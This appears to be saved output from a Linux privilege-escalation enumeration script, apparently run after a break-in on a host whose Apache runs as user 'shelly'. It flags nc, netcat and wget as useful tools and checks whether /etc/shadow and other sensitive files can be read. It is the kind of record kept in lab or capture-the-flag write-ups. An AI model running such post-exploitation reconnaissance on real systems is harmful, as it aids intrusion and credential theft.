+-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
+-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
+-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
+-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
+-rwxr-xr-x  1 root root 1226 Jun  9  2015 screen-cleanup
+-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
+-rwxr-xr-x  1 root root  597 Jan 19  2016 single
+-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
+-rwxr-xr-x  1 root root 4077 Apr 27  2016 ssh
+-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
+-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
+-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
+-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
+-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
+-rwxr-xr-x  1 root root 1391 Apr 20  2017 unattended-upgrades
+-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
+-rwxr-xr-x  1 root root 1306 May 26  2016 uuidd
+
+
+[00;33m### SOFTWARE #############################################[00m
+[00;31mSudo version:[00m
+Sudo version 1.8.16
+
+
+[00;31mApache version:[00m
+Server version: Apache/2.4.18 (Ubuntu)
+Server built:   2017-09-18T15:09:02
+
+
+[00;31mApache user configuration:[00m
+APACHE_RUN_USER=shelly
+APACHE_RUN_GROUP=shelly
+
+
+[00;33m### INTERESTING FILES ####################################[00m
+[00;31mUseful file locations:[00m
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+
+
+[00;31mCan we read/write sensitive files:[00m
+-rw-r--r-- 1 root root 1567 Sep 22 12:33 /etc/passwd
+-rw-r--r-- 1 root root 801 Sep 22 15:42 /etc/group
+-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
+-rw-r----- 1 root shadow 1041 Sep 22 15:32 /etc/shadow
+
+
+Can't search *.conf files as no keyword was entered
+
+Can't search *.log files as no keyword was entered
+
+Can't search *.ini files as no keyword was entered
+
+[00;31mAll *.conf files in /etc (recursive 1 level):[00m
+-rw-r--r-- 1 root root 350 Sep 22 12:32 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
+-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
+-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf
+-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
+-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
+-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
+-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
+-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
+-rw-r--r-- 1 root root 7788 Sep 22 12:32 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 144 Sep 22 12:33 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 3028 Jul 19  2016 /etc/adduser.conf
+-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
+-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
+-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
+-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
+-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
+-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
+-rw-r--r-- 1 root root 100 Nov 25  2015 /etc/sos.conf
+-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 6816 May 11  2017 /etc/overlayroot.conf
+-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
+-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
+
+
+[00;31mCurrent user's history files:[00m
+-rw------- 1 root root 0 Sep 25 08:29 /home/shelly/.bash_history
+
+
+[00;31mAny interesting mail in /var/mail:[00m
+total 8
+drwxrwsr-x  2 root mail 4096 Jul 19  2016 .
+drwxr-xr-x 14 root root 4096 Sep 22 14:11 ..
+
+
+[00;33m### SCAN COMPLETE ####################################[00m
